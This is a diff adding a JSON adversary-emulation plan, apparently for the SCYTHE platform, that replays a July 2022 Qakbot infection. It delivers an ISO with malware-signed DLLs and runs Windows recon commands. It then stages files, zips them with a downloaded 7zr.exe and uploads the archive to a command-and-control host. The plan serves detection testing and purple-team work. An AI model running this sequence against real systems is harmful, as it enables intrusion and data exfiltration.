@@ -1,0 +1,297 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Qakbot emulation for July 14, 2022 sample.",
+        "display_name": "Qakbot-2022-July",
+        "name": "Qakbot-2022-July",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "{\"--cp\":\"jake37.scythe.services:443\",\"--secure\":true,\"--multipart\":10240}",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "2": {
+                "name": "MALWARE",
+                "type": "assign",
+                "value": "The ISO contains two DLL files, both of which will signature as malware. WindowsCodecs.dll was written by SCYTHE and emulates the Qakbot loader exactly. The file 7533.dll is a patched Qakbot DLL. It will sleep for two hours before exiting from the DLL entry point without doing anything else."
+            },
+            "3": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS://shared/threats/Qakbot-2022-July/Report Jul 14 47787.iso\" --dest \"%USERPROFILE%\\\\Downloads\\\\Report Jul 14 47787.iso\"",
+                "type": "message"
+            },
+            "4": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "5": {
+                "name": "MOUNT-IMAGE",
+                "type": "assign",
+                "value": "The user would double click on the ISO. Since we don't have a user, we'll use PowerShell. You probably should not perform detection engineering against this."
+            },
+            "6": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe -command Mount-Diskimage -ImagePath \\\"%USERPROFILE%\\Downloads\\Report Jul 14 47787.iso\\\"",
+                "type": "message"
+            },
+            "7": {
+                "name": "DONOTSIGNATURE",
+                "type": "assign",
+                "value": "This program simulates the user clicking on the link by using ShellExecute and assigning the appropriate working directory."
+            },
+            "8": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS://shared/threats/Qakbot-2022-July/click-icon.exe\" --dest \"%USERPROFILE%\\\\Desktop\\\\not-for-detections.exe\"",
+                "type": "message"
+            },
+            "9": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c %USERPROFILE%\\\\desktop\\\\not-for-detections.exe",
+                "type": "message"
+            },
+            "10": {
+                "name": "POST-EXPLOITATION",
+                "type": "assign",
+                "value": "This section begins post-exploitation steps seen taken by threat actors using Qakbot for recon and data theft."
+            },
+            "11": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "whoami /all",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c set",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message"
+            },
+            "13": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "arp -a",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1590.005"
+                ],
+                "type": "message"
+            },
+            "14": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "ipconfig /all",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1590.005"
+                ],
+                "type": "message"
+            },
+            "15": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net view /all",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1590",
+                    "att&ck-technique:T1135"
+                ],
+                "type": "message"
+            },
+            "16": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net share",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1135"
+                ],
+                "type": "message"
+            },
+            "17": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "route print",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1590.004"
+                ],
+                "type": "message"
+            },
+            "18": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "netstat -nao",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1046",
+                    "att&ck-technique:T1057"
+                ],
+                "type": "message"
+            },
+            "19": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net localgroup",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1069.001"
+                ],
+                "type": "message"
+            },
+            "20": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c mkdir C:\\datop",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1074.001"
+                ],
+                "type": "message"
+            },
+            "21": {
+                "module": "loader",
+                "module_to_load": "file",
+                "request": "--load file",
+                "type": "message"
+            },
+            "22": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path C:\\datop\\1.eml --size 25612 --random",
+                "rtags": [
+                    "att&ck-technique:T1074.001",
+                    "att&ck-technique:T1114.001"
+                ],
+                "type": "message"
+            },
+            "23": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path C:\\datop\\2.eml --size 147665 --random",
+                "rtags": [
+                    "att&ck-technique:T1074.001",
+                    "att&ck-technique:T1114.001"
+                ],
+                "type": "message"
+            },
+            "24": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path C:\\datop\\3.eml --size 66090 --random",
+                "rtags": [
+                    "att&ck-technique:T1074.001",
+                    "att&ck-technique:T1114.001"
+                ],
+                "type": "message"
+            },
+            "25": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path C:\\datop\\4.eml --size 91652 --random",
+                "rtags": [
+                    "att&ck-technique:T1074.001",
+                    "att&ck-technique:T1114.001"
+                ],
+                "type": "message"
+            },
+            "26": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"https://www.7-zip.org/a/7zr.exe\" --dest \"C:\\\\datop\\\\7zr.exe\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "27": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "C:\\datop\\7zr.exe a C:\\datop\\emails.zip c:\\datop\\*eml",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1560.001"
+                ],
+                "type": "message"
+            },
+            "28": {
+                "module": "loader",
+                "module_to_load": "uploader",
+                "request": "--load uploader",
+                "type": "message"
+            },
+            "29": {
+                "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea",
+                "module": "uploader",
+                "request": "--remotepath \"C:\\\\datop\\\\emails.zip\"",
+                "rtags": [
+                    "att&ck-technique:T1041"
+                ],
+                "type": "message"
+            },
+            "30": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c rmdir /s /q C:\\datop",
+                "type": "message"
+            },
+            "31": {
+                "name": "CLEANUP",
+                "type": "assign",
+                "value": "These steps are to clean up SCYTHE generated files. Do not signature on these steps."
+            },
+            "32": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe -command Dismount-Diskimage \\\"%USERPROFILE%\\Downloads\\Report Jul 14 47787.iso\\\"",
+                "type": "message"
+            },
+            "33": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c del \"%USERPROFILE%\\Downloads\\Report Jul 14 47787.iso\"",
+                "type": "message"
+            },
+            "34": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c del \"%USERPROFILE%\\Desktop\\not-for-detections.exe\"",
+                "type": "message"
+            },
+            "35": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe \"$procs=Get-CimInstance -ClassName Win32_Process -Filter \\\"CommandLine LIKE '%7533.dll%'\\\";foreach ($proc in $procs){stop-process -id $proc.ProcessId }\"",
+                "type": "message"
+            },
+            "36": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--shutdown",
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
+    }
+}
